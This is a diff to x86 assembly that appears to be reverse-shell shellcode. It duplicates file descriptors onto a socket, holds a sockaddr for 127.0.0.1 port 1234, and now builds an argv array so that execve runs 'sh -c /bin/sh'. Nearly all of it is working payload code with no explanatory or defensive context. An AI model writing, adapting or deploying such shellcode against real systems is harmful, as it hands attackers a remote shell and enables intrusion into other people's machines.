@@ -64,11 +64,32 @@ dup2:
 	mov	$SYS_dup2,%eax
 	int	$0x80
 
-execve:
-	xor	%edx,%edx
-	xor	%ecx,%ecx
-	lea	8(%esi),%ebx
-	mov	$SYS_execve,%eax
+	add	$8,%esi
+
+build_argv:	
+	pushl	$0			# argv[n] = NULL
+	movl	%esi, %eax
+	jmp	2f
+
+1:
+	add	$1, %eax
+2:
+	cmpb	$0, (%eax)
+	jz	continue
+	pushl	%eax			# argv[n]
+3:
+	cmpb	$0, (%eax)
+	jz	1b
+	add	$1, %eax
+	jmp	3b
+
+continue:
+	pushl	$0x0			#envp[0] = NULL
+	
+	movl	%esp, %edx		# char *envp[]
+	lea	0x4(%esp), %ecx		# char *argv[]
+	movl	(%ecx), %ebx		# char *filename
+	movl	$SYS_execve,%eax	# sys_execve()
 	int	$0x80
 
 exit1:
@@ -83,4 +104,6 @@ addr:
 .short	2
 .short	0xD204
 .byte	127,0,0,1
-.ascii	"/bin/sh\x00"
+.ascii "sh\000"
+.ascii "-c\000"
+.ascii "/bin/sh\000\000"
